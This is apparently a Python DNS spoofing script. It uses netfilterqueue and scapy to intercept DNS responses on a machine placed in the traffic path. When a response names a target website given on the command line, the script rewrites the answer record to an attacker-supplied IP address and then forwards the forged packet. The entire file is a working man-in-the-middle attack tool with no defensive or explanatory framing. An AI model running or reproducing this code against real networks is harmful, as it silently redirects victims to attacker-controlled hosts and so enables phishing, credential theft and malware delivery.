import netfilterqueue
import scapy.all as scapy
import optparse

def get_argument():
    parser = optparse.OptionParser()
    parser.add_option("-w","--webname", dest="web_name", help="enter the website for spoofing")
    parser.add_option("-i","--ip", dest="spoof_ip", help="enter the spoof ip address ")
    (options, arguments) = parser.parse_args()
    if not options.web_name:
        parser.error("[-] Enter the the website  --help for more information")
    elif not options.spoof_ip:
        parser.error("[-] Enter the  enter the spoof ip address --help for more information")
    else:
        return options
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = str(scapy_packet[scapy.DNSQR].qname).strip('.')
        if options.web_name in qname:
            print("[+] Spoofing the target for:", qname)
            answer = scapy.DNSRR(rrname=qname, rdata=options.spoof_ip)  # Spoofed IP
            scapy_packet[scapy.DNS].an = answer  # Set the answer
            scapy_packet[scapy.DNS].ancount = 1  # Set answer count

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))  # Set the modified packet payload
    packet.accept()  # Accept the packet
options = get_argument()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
